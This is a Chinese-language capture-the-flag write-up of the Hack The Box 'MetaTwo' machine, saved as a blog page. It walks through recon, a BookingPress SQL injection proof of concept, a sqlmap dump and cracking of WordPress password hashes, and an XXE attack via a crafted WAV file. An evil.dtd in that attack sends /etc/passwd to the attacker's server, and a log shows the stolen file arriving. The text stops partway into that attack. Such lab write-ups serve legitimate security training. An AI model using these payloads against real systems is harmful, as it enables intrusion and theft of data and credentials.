@@ -1,0 +1,1215 @@
+<!DOCTYPE html>
+<html>
+<head>
+    
+
+    
+
+    
+
+
+
+    <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="utf-8">
+    
+    
+    
+    
+    <title>MetaTwo - Hackthebox | Lucifiel&#39;s Blog | Lucifiel 技术博客</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="theme-color" content="#3F51B5">
+    
+    
+    <meta name="keywords" content="Hackthebox">
+    <meta name="description" content="Hackthebox - MetaTwo靶场信息  靶场类型  信息收集Nmap┌──(root㉿kali)-[~&#x2F;Desktop] └─# nmap -sS -sV -A -sC -p- --min-rate 5000 10.10.11.186 Starting Nmap 7.93 ( https:&#x2F;&#x2F;nmap.org ) at 2022-12-23 01:52 EST Warning: 10.">
+<meta property="og:type" content="article">
+<meta property="og:title" content="MetaTwo - Hackthebox">
+<meta property="og:url" content="http://www.lucifiel.com/2022/10/29/Hackthebox/Easy/Hackthebox-MetaTwo/index.html">
+<meta property="og:site_name" content="Lucifiel&#39;s Blog">
+<meta property="og:description" content="Hackthebox - MetaTwo靶场信息  靶场类型  信息收集Nmap┌──(root㉿kali)-[~&#x2F;Desktop] └─# nmap -sS -sV -A -sC -p- --min-rate 5000 10.10.11.186 Starting Nmap 7.93 ( https:&#x2F;&#x2F;nmap.org ) at 2022-12-23 01:52 EST Warning: 10.">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://www.lucifiel.com/2022/10/29/Hackthebox/Easy/Hackthebox-MetaTwo/uR6cU3c1jgvI8p_TtboYiEPlmfFY_p4qdXdZmmDLjKY.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/10/29/Hackthebox/Easy/Hackthebox-MetaTwo/EovdXT77sIyt_X7TJipFrHeG_6QnDkkhZKKjLqhF3D0.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/10/29/Hackthebox/Easy/Hackthebox-MetaTwo/9nAAPY7TMRDXl3dWSXViz1hRbAdzvJqAMJem_Zmsyl0.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/10/29/Hackthebox/Easy/Hackthebox-MetaTwo/nO4dQvMqb5e2Pc5-oz9Hb_5wJWDk3TApcQIfH8HOwYI.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/10/29/Hackthebox/Easy/Hackthebox-MetaTwo/hotp2ayPMJjZ1Ew2f8YaAlRpLvuPG5RNNHuB42Qejok.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/10/29/Hackthebox/Easy/Hackthebox-MetaTwo/9PFSpyMIeZT43lK1tBcABBBQFTI3T7yGGTEMXh4ZDRo.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/10/29/Hackthebox/Easy/Hackthebox-MetaTwo/yT76Ix0j2yfaIrCA7VSSXE5ytJP8Pf7qNlAfwE-ZjuI.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/10/29/Hackthebox/Easy/Hackthebox-MetaTwo/cRE-S9q01Pn_cr4X18m_UTTZ3B5IXisa6P_xyiMnF_Y.png">
+<meta property="article:published_time" content="2022-10-29T11:38:36.000Z">
+<meta property="article:modified_time" content="2023-06-17T02:19:32.141Z">
+<meta property="article:author" content="Lucifiel">
+<meta property="article:tag" content="Hackthebox">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://www.lucifiel.com/2022/10/29/Hackthebox/Easy/Hackthebox-MetaTwo/uR6cU3c1jgvI8p_TtboYiEPlmfFY_p4qdXdZmmDLjKY.png">
+    
+        <link rel="alternate" type="application/atom+xml" title="Lucifiel&#39;s Blog" href="/atom.xml">
+    
+    <link rel="shortcut icon" href="/favicon.ico">
+    <link rel="stylesheet" href="//unpkg.com/hexo-theme-material-indigo@latest/css/style.css">
+    <script>window.lazyScripts=[]</script>
+
+    <!-- custom head -->
+    
+
+<meta name="generator" content="Hexo 4.2.1"><!-- hexo-inject:begin --><!-- hexo-inject:end --></head>
+
+<body>
+    <!-- hexo-inject:begin --><!-- hexo-inject:end --><div id="loading" class="active"></div>
+
+    <aside id="menu" class="hide" >
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap" style="background-image:url(/img/brand.jpg)">
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/avatar.jpg">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname">Lucifiel</h5>
+          <a href="mailto:LucifielHack@qq.com" title="LucifielHack@qq.com" class="mail">LucifielHack@qq.com</a>
+        </hgroup>
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+            <li class="waves-block waves-effect">
+              <a href="/"  >
+                <i class="icon icon-lg icon-home"></i>
+                主页
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/archives"  >
+                <i class="icon icon-lg icon-archives"></i>
+                Archives
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/tags"  >
+                <i class="icon icon-lg icon-tags"></i>
+                Tags
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/categories"  >
+                <i class="icon icon-lg icon-th-list"></i>
+                Categories
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://github.com/LucifielHack" target="_blank" >
+                <i class="icon icon-lg icon-github"></i>
+                Github
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/about"  >
+                <i class="icon icon-lg icon-user"></i>
+                About
+              </a>
+            </li>
+        
+      </ul>
+    </div>
+  </div>
+</aside>
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row">
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">MetaTwo - Hackthebox</div>
+        
+        <div class="search-wrap" id="search-wrap">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
+                <i class="icon icon-lg icon-chevron-left"></i>
+            </a>
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="输入感兴趣的关键字">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
+                <i class="icon icon-lg icon-search"></i>
+            </a>
+        </div>
+        
+        
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
+            <i class="icon icon-lg icon-share-alt"></i>
+        </a>
+        
+    </div>
+</header>
+<header class="content-header post-header">
+
+    <div class="container fade-scale">
+        <h1 class="title">MetaTwo - Hackthebox</h1>
+        <h5 class="subtitle">
+            
+                <time datetime="2022-10-29T11:38:36.000Z" itemprop="datePublished" class="page-time">
+  2022-10-29
+</time>
+
+
+            
+        </h5>
+    </div>
+
+    
+
+
+</header>
+
+
+<div class="container body-wrap">
+    
+    <aside class="post-widget">
+        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
+            <h4>TOC</h4>
+            <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Hackthebox-MetaTwo"><span class="post-toc-text">Hackthebox - MetaTwo</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#靶场信息"><span class="post-toc-text">靶场信息</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#靶场类型"><span class="post-toc-text">靶场类型</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#信息收集"><span class="post-toc-text">信息收集</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Nmap"><span class="post-toc-text">Nmap</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Http"><span class="post-toc-text">Http</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Wpscan"><span class="post-toc-text">Wpscan</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#漏洞利用"><span class="post-toc-text">漏洞利用</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#权限提升"><span class="post-toc-text">权限提升</span></a></li></ol>
+        </nav>
+    </aside>
+
+
+<article id="post-Hackthebox/Easy/Hackthebox-MetaTwo"
+  class="post-article article-type-post fade" itemprop="blogPost">
+
+    <div class="post-card">
+        <h1 class="post-card-title">MetaTwo - Hackthebox</h1>
+        <div class="post-meta">
+            <time class="post-time" title="2022-10-29 19:38:36" datetime="2022-10-29T11:38:36.000Z"  itemprop="datePublished">2022-10-29</time>
+
+            
+
+
+            
+<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
+    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>
+</span>
+
+
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            <h1 id="Hackthebox-MetaTwo"><a href="#Hackthebox-MetaTwo" class="headerlink" title="Hackthebox - MetaTwo"></a>Hackthebox - MetaTwo</h1><h1 id="靶场信息"><a href="#靶场信息" class="headerlink" title="靶场信息"></a>靶场信息</h1><img src="/2022/10/29/Hackthebox/Easy/Hackthebox-MetaTwo/uR6cU3c1jgvI8p_TtboYiEPlmfFY_p4qdXdZmmDLjKY.png" class title="image">
+
+<h1 id="靶场类型"><a href="#靶场类型" class="headerlink" title="靶场类型"></a>靶场类型</h1><img src="/2022/10/29/Hackthebox/Easy/Hackthebox-MetaTwo/EovdXT77sIyt_X7TJipFrHeG_6QnDkkhZKKjLqhF3D0.png" class title="image">
+
+<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><pre><code class="bash">┌──(root㉿kali)-[~/Desktop]
+└─# nmap -sS -sV -A -sC -p- --min-rate 5000 10.10.11.186
+Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-23 01:52 EST
+Warning: 10.10.11.186 giving up on port because retransmission cap hit (10).
+Nmap scan report for 10.10.11.186
+Host is up (0.44s latency).
+Not shown: 65532 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp
+| fingerprint-strings: 
+|   GenericLines: 
+|     220 ProFTPD Server (Debian) [::ffff:10.10.11.186]
+|     Invalid command: try being more creative
+|_    Invalid command: try being more creative
+22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
+| ssh-hostkey: 
+|   3072 c4b44617d2102d8fec1dc927fecd79ee (RSA)
+|   256 2aea2fcb23e8c529409cab866dcd4411 (ECDSA)
+|_  256 fd78c0b0e22016fa050debd83f12a4ab (ED25519)
+80/tcp open  http    nginx 1.18.0
+|_http-title: Did not follow redirect to http://metapress.htb/
+|_http-server-header: nginx/1.18.0
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port21-TCP:V=7.93%I=7%D=12/23%Time=63A55072%P=x86_64-pc-linux-gnu%r(Gen
+SF:ericLines,8F,&quot;220\x20ProFTPD\x20Server\x20\(Debian\)\x20\[::ffff:10\.10
+SF:\.11\.186\]\r\n500\x20Invalid\x20command:\x20try\x20being\x20more\x20cr
+SF:eative\r\n500\x20Invalid\x20command:\x20try\x20being\x20more\x20creativ
+SF:e\r\n&quot;);
+Aggressive OS guesses: Linux 5.0 - 5.3 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Linux 4.15 - 5.6 (94%), Linux 5.3 - 5.4 (94%), Linux 2.6.32 (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 2.6.32 - 3.10 (92%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE (using port 8080/tcp)
+HOP RTT       ADDRESS
+1   408.01 ms 10.10.16.1
+2   648.09 ms 10.10.11.186
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 148.71 seconds
+</code></pre>
+<p>首先加入一个 hosts 解析</p>
+<pre><code class="bash">echo 10.10.11.186 metapress.htb &gt;&gt; /etc/hosts
+</code></pre>
+<h2 id="Http"><a href="#Http" class="headerlink" title="Http"></a>Http</h2><img src="/2022/10/29/Hackthebox/Easy/Hackthebox-MetaTwo/9nAAPY7TMRDXl3dWSXViz1hRbAdzvJqAMJem_Zmsyl0.png" class title="image">
+
+<p>是我翻译器不对吗，这里首页翻译出来意思是欢迎登记？我不是很明白是什么意思，这里给出了两个信息，有一个 &#x2F;events&#x2F; 目录，以及该页面是用 wordpress 搭建的。我们到处做一下信息收集</p>
+<h2 id="Wpscan"><a href="#Wpscan" class="headerlink" title="Wpscan"></a>Wpscan</h2><pre><code class="bash">┌──(root㉿kali)-[~/Desktop]
+└─# wpscan --url &quot;http://metapress.htb/&quot; --enumerate vt vp
+_______________________________________________________________
+         __          _______   _____
+         \ \        / /  __ \ / ____|
+          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
+           \ \/  \/ / |  ___/ \___ \ / __|/ _` | &#39;_ \
+            \  /\  /  | |     ____) | (__| (_| | | | |
+             \/  \/   |_|    |_____/ \___|\__,_|_| |_|
+
+         WordPress Security Scanner by the WPScan Team
+                         Version 3.8.22
+       Sponsored by Automattic - https://automattic.com/
+       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
+_______________________________________________________________
+
+[+] URL: http://metapress.htb/ [10.10.11.186]
+[+] Started: Fri Dec 23 02:23:08 2022
+
+Interesting Finding(s):
+
+[+] Headers
+ | Interesting Entries:
+ |  - Server: nginx/1.18.0
+ |  - X-Powered-By: PHP/8.0.24
+ | Found By: Headers (Passive Detection)
+ | Confidence: 100%
+
+[+] robots.txt found: http://metapress.htb/robots.txt
+ | Interesting Entries:
+ |  - /wp-admin/
+ |  - /wp-admin/admin-ajax.php
+ | Found By: Robots Txt (Aggressive Detection)
+ | Confidence: 100%
+
+[+] XML-RPC seems to be enabled: http://metapress.htb/xmlrpc.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+ | References:
+ |  - http://codex.wordpress.org/XML-RPC_Pingback_API
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
+ |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/
+
+[+] WordPress readme found: http://metapress.htb/readme.html
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+
+[+] The external WP-Cron seems to be enabled: http://metapress.htb/wp-cron.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 60%
+ | References:
+ |  - https://www.iplocation.net/defend-wordpress-from-ddos
+ |  - https://github.com/wpscanteam/wpscan/issues/1299
+
+[+] WordPress version 5.6.2 identified (Insecure, released on 2021-02-22).
+ | Found By: Rss Generator (Passive Detection)
+ |  - http://metapress.htb/feed/, &lt;generator&gt;https://wordpress.org/?v=5.6.2&lt;/generator&gt;
+ |  - http://metapress.htb/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=5.6.2&lt;/generator&gt;
+
+[+] WordPress theme in use: twentytwentyone
+ | Location: http://metapress.htb/wp-content/themes/twentytwentyone/
+ | Last Updated: 2022-11-02T00:00:00.000Z
+ | Readme: http://metapress.htb/wp-content/themes/twentytwentyone/readme.txt
+ | [!] The version is out of date, the latest version is 1.7
+ | Style URL: http://metapress.htb/wp-content/themes/twentytwentyone/style.css?ver=1.1
+ | Style Name: Twenty Twenty-One
+ | Style URI: https://wordpress.org/themes/twentytwentyone/
+ | Description: Twenty Twenty-One is a blank canvas for your ideas and it makes the block editor your best brush. Wi...
+ | Author: the WordPress team
+ | Author URI: https://wordpress.org/
+ |
+ | Found By: Css Style In Homepage (Passive Detection)
+ | Confirmed By: Css Style In 404 Page (Passive Detection)
+ |
+ | Version: 1.1 (80% confidence)
+ | Found By: Style (Passive Detection)
+ |  - http://metapress.htb/wp-content/themes/twentytwentyone/style.css?ver=1.1, Match: &#39;Version: 1.1&#39;
+
+[+] Enumerating Vulnerable Themes (via Passive and Aggressive Methods)
+ Checking Known Locations - Time: 00:00:31 &lt;===================================================================================================================================&gt; (482 / 482) 100.00% Time: 00:00:31
+[+] Checking Theme Versions (via Passive and Aggressive Methods)
+
+[i] No themes Found.
+
+[!] No WPScan API Token given, as a result vulnerability data has not been output.
+[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register
+
+[+] Finished: Fri Dec 23 02:23:51 2022
+[+] Requests Done: 509
+[+] Cached Requests: 14
+[+] Data Sent: 154.463 KB
+[+] Data Received: 518.845 KB
+[+] Memory used: 186.137 MB
+[+] Elapsed time: 00:00:43
+</code></pre>
+<p>这里确定了 wordpress 的版本为 5.6.2，然后发现了两个页面</p>
+<pre><code class="bash">/wp-admin/
+/wp-admin/admin-ajax.php
+</code></pre>
+<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>我们在第二个页面中发现了一个插件 bookingpress 1.0.10</p>
+<img src="/2022/10/29/Hackthebox/Easy/Hackthebox-MetaTwo/nO4dQvMqb5e2Pc5-oz9Hb_5wJWDk3TApcQIfH8HOwYI.png" class title="image">
+
+<blockquote>
+<p><a href="https://wpscan.com/vulnerability/388cd42d-b61a-42a4-8604-99b812db2357" target="_blank" rel="noopener">https://wpscan.com/vulnerability/388cd42d-b61a-42a4-8604-99b812db2357</a></p>
+</blockquote>
+<p>发现了一个漏洞，似乎是允许我们进行注入的漏洞漏洞</p>
+<p>对于这项漏洞的利用，我们需要一些信息，我们可以在 &#x2F;wp-admin&#x2F;admin-ajax.php 中找到</p>
+<img src="/2022/10/29/Hackthebox/Easy/Hackthebox-MetaTwo/hotp2ayPMJjZ1Ew2f8YaAlRpLvuPG5RNNHuB42Qejok.png" class title="image">
+
+
+
+<pre><code class="bash">_wpnonce = b0a6dfdddb
+</code></pre>
+<p>然后我们就可以构造 poc 了</p>
+<pre><code class="bash">curl -i &#39;http://metapress.htb/wp-admin/admin-ajax.php&#39; --data &#39;action=bookingpress_front_get_category_services&amp;_wpnonce=b0a6dfdddb&amp;category_id=33&amp;total_service=-7502) UNION ALL SELECT @@version,@@version_comment,@@version_compile_os,1,2,3,4,5,6-- -&#39; -x http://127.0.0.1:8080
+</code></pre>
+<p>然后使用 curl 的 -x 参数将包发送到 burp 中</p>
+<img src="/2022/10/29/Hackthebox/Easy/Hackthebox-MetaTwo/9PFSpyMIeZT43lK1tBcABBBQFTI3T7yGGTEMXh4ZDRo.png" class title="image">
+
+<img src="/2022/10/29/Hackthebox/Easy/Hackthebox-MetaTwo/yT76Ix0j2yfaIrCA7VSSXE5ytJP8Pf7qNlAfwE-ZjuI.png" class title="image">
+
+<p>然后使用 copytofile 将其保存为 admin.req</p>
+<pre><code class="bash">POST /wp-admin/admin-ajax.php HTTP/1.1
+Host: metapress.htb
+User-Agent: curl/7.85.0
+Accept: */*
+Content-Length: 185
+Content-Type: application/x-www-form-urlencoded
+Connection: close
+
+action=bookingpress_front_get_category_services&amp;_wpnonce=b0a6dfdddb&amp;category_id=33&amp;total_service=-7502) UNION ALL SELECT @@version,@@version_comment,@@version_compile_os,1,2,3,4,5,6-- -
+</code></pre>
+<p>这是我们保存下来的文件，我们需要稍微修改一下，将 total_service 后面的参数改为 1</p>
+<pre><code class="bash">POST /wp-admin/admin-ajax.php HTTP/1.1
+Host: metapress.htb
+User-Agent: curl/7.85.0
+Accept: */*
+Content-Length: 185
+Content-Type: application/x-www-form-urlencoded
+Connection: close
+
+action=bookingpress_front_get_category_services&amp;_wpnonce=b0a6dfdddb&amp;category_id=33&amp;total_service=1
+</code></pre>
+<p>这是我们修改好的文件，然后丢进 sqlmap 跑就行了</p>
+<pre><code class="bash">┌──(root㉿kali)-[~/Desktop]
+└─# sqlmap -r admin.req -p total_service --batch -D blog -T wp_users --dump
+
++----+----------------------+------------------------------------+-----------------------+------------+-------------+--------------+---------------+---------------------+---------------------+
+| ID | user_url             | user_pass                          | user_email            | user_login | user_status | display_name | user_nicename | user_registered     | user_activation_key |
++----+----------------------+------------------------------------+-----------------------+------------+-------------+--------------+---------------+---------------------+---------------------+
+| 1  | http://metapress.htb | $P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV. | admin@metapress.htb   | admin      | 0           | admin        | admin         | 2022-06-23 17:58:28 | &lt;blank&gt;             |
+| 2  | &lt;blank&gt;              | $P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70 | manager@metapress.htb | manager    | 0           | manager      | manager       | 2022-06-23 18:07:55 | &lt;blank&gt;             |
++----+----------------------+------------------------------------+-----------------------+------------+-------------+--------------+---------------+---------------------+---------------------+
+</code></pre>
+<p>然后把 user_pass 的 hash 丢进 john 里跑一下</p>
+<pre><code class="bash">┌──(root㉿kali)-[~/Desktop]
+└─# john --wordlist=/usr/share/wordlists/rockyou.txt hash 
+Using default input encoding: UTF-8
+Loaded 2 password hashes with 2 different salts (phpass [phpass ($P$ or $H$) 128/128 AVX 4x3])
+Cost 1 (iteration count) is 8192 for all loaded hashes
+Will run 4 OpenMP threads
+Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status
+partylikearockstar (?)     
+1g 0:00:10:20 DONE (2022-12-23 03:03) 0.001610g/s 23102p/s 23280c/s 23280C/s  joefeher..*7¡Vamos!
+Use the &quot;--show --format=phpass&quot; options to display all of the cracked passwords reliably
+Session completed.
+</code></pre>
+<p>这里跑出来了一个密码 partylikearockstar</p>
+<p>使用这个密码去 <a href="http://metapress.htb/wp-admin/" target="_blank" rel="noopener">http://metapress.htb/wp-admin/</a> 进行登陆</p>
+<pre><code class="bash">username = manager
+password = partylikearockstar
+</code></pre>
+<blockquote>
+<p><a href="https://wpscan.com/vulnerability/cbbe6c17-b24e-4be4-8937-c78472a138b5" target="_blank" rel="noopener">https://wpscan.com/vulnerability/cbbe6c17-b24e-4be4-8937-c78472a138b5</a></p>
+</blockquote>
+<blockquote>
+<p><a href="https://blog.wpsec.com/wordpress-xxe-in-media-library-cve-2021-29447/" target="_blank" rel="noopener">https://blog.wpsec.com/wordpress-xxe-in-media-library-cve-2021-29447/</a></p>
+</blockquote>
+<p>经过版本搜索，找到了一个 5.6.2 存在的 XXE漏洞</p>
+<p>这个漏洞的大致解释就是，WordPress 的作者（可编辑者）可以将媒体文件上传到 WordPress 媒体库，以便在帖子中使用它。上传 WAVE 音频文件后，WordPress 函数会从包含恶意 XML 外部实体的变量中包含 <code>wp_read_audio_metadata()</code> 的 iXML 元数据中提取音频信息。</p>
+<pre><code class="bash">echo -en &#39;RIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE ANY[&lt;!ENTITY % remote SYSTEM &#39;&quot;&#39;&quot;&#39;http://10.10.14.84:9000/evil.dtd&#39;&quot;&#39;&quot;&#39;&gt;%remote;%init;%trick;]&gt;\x00&#39; &gt; payload.wav
+</code></pre>
+<p>修改好我们的 payload，然后生成一个 payload</p>
+<p>然后在 evil.dtd 中，放入我们的恶意 XML 代码</p>
+<pre><code class="bash">&lt;!ENTITY % file SYSTEM &quot;php://filter/convert.base64-encode/resource=/etc/passwd&quot; &gt;
+&lt;!ENTITY % init &quot;&lt;!ENTITY &amp;#x25; trick SYSTEM &#39;http://10.10.14.84:9000/?p=%file;&#39;&gt;&quot;&gt;
+</code></pre>
+<p>接着使用 PHP 开启一个 http 服务器</p>
+<pre><code class="bash">php -S 0.0.0.0:9000
+</code></pre>
+<p>接着我们点击左侧仪表盘的 Media -&gt; Library 并上传我们的 payload.wav</p>
+<img src="/2022/10/29/Hackthebox/Easy/Hackthebox-MetaTwo/cRE-S9q01Pn_cr4X18m_UTTZ3B5IXisa6P_xyiMnF_Y.png" class title="image">
+
+<pre><code class="bash">┌──(root㉿kali)-[~/Desktop]
+└─# php -S 0.0.0.0:9000
+[Sat Dec 31 13:35:59 2022] PHP 8.1.12 Development Server (http://0.0.0.0:9000) started
+[Sat Dec 31 13:36:05 2022] 10.10.11.186:57332 Accepted
+[Sat Dec 31 13:36:05 2022] 10.10.11.186:57332 [200]: GET /evil.dtd
+[Sat Dec 31 13:36:05 2022] 10.10.11.186:57332 Closing
+[Sat Dec 31 13:36:06 2022] 10.10.11.186:57342 Accepted
+[Sat Dec 31 13:36:06 2022] 10.10.11.186:57342 [404]: GET /?p=cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovcnVuL2lyY2Q6L3Vzci9zYmluL25vbG9naW4KZ25hdHM6eDo0MTo0MTpHbmF0cyBCdWctUmVwb3J0aW5nIFN5c3RlbSAoYWRtaW4pOi92YXIvbGliL2duYXRzOi91c3Ivc2Jpbi9ub2xvZ2luCm5vYm9keTp4OjY1NTM0OjY1NTM0Om5vYm9keTovbm9uZXhpc3RlbnQ6L3Vzci9zYmluL25vbG9naW4KX2FwdDp4OjEwMDo2NTUzNDo6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtbmV0d29yazp4OjEwMToxMDI6c3lzdGVtZCBOZXR3b3JrIE1hbmFnZW1lbnQsLCw6L3J1bi9zeXN0ZW1kOi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtcmVzb2x2ZTp4OjEwMjoxMDM6c3lzdGVtZCBSZXNvbHZlciwsLDovcnVuL3N5c3RlbWQ6L3Vzci9zYmluL25vbG9naW4KbWVzc2FnZWJ1czp4OjEwMzoxMDk6Oi9ub25leGlzdGVudDovdXNyL3NiaW4vbm9sb2dpbgpzc2hkOng6MTA0OjY1NTM0OjovcnVuL3NzaGQ6L3Vzci9zYmluL25vbG9naW4Kam5lbHNvbjp4OjEwMDA6MTAwMDpqbmVsc29uLCwsOi9ob21lL2puZWxzb246L2Jpbi9iYXNoCnN5c3RlbWQtdGltZXN5bmM6eDo5OTk6OTk5OnN5c3RlbWQgVGltZSBTeW5jaHJvbml6YXRpb246LzovdXNyL3NiaW4vbm9sb2dpbgpzeXN0ZW1kLWNvcmVkdW1wOng6OTk4Ojk5ODpzeXN0ZW1kIENvcmUgRHVtcGVyOi86L3Vzci9zYmluL25vbG9naW4KbXlzcWw6eDoxMDU6MTExOk15U1FMIFNlcnZlciwsLDovbm9uZXhpc3RlbnQ6L2Jpbi9mYWxzZQpwcm9mdHBkOng6MTA2OjY1NTM0OjovcnVuL3Byb2Z0cGQ6L3Vzci9zYmluL25vbG9naW4KZnRwOng6MTA3OjY1NTM0Ojovc3J2L2Z0cDovdXNyL3NiaW4vbm9sb2dpbgo= - No such file or directory
+[Sat Dec 31 13:36:06 2022] 10.10.11.186:57342 Closing
+[Sat Dec 31 13:36:06 2022] 10.10.11.186:57350 Accepted
+[Sat Dec 31 13:36:06 2022] 10.10.11.186:57350 [200]: GET /evil.dtd
+[Sat Dec 31 13:36:06 2022] 10.10.11.186:57350 Closing
+[Sat Dec 31 13:36:07 2022] 10.10.11.186:57360 Accepted
